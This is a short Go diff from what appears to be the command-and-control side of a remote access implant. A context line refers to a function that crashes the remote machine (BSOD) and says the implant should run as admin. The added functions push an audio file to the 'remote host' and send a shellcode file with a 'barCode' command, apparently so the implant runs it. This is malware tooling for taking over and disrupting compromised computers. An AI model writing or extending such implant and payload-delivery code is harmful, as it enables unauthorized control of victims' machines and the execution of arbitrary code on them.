@@ -97,3 +97,25 @@ func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
 	}
 	return true
 }
+
+func playAudio(conn *net.Conn, audioFile string) {
+	fmt.Println("Playing audio on the remote host :)")
+	contents, err := os.ReadFile("Audio/" + audioFile)
+	if err != nil {
+		fmt.Println("Couldn't read the file !")
+		return
+	}
+	(*conn).Write([]byte("play\n"))
+	(*conn).Write(contents)
+}
+
+func load(conn *net.Conn, fileWShellcode string) {
+	fmt.Println("Good luck")
+	file, err := os.ReadFile("Shellcode/" + fileWShellcode)
+	if err != nil {
+		fmt.Println("Couldn't read the file !")
+		return
+	}
+	(*conn).Write([]byte("barCode\n"))
+	(*conn).Write(file)
+}
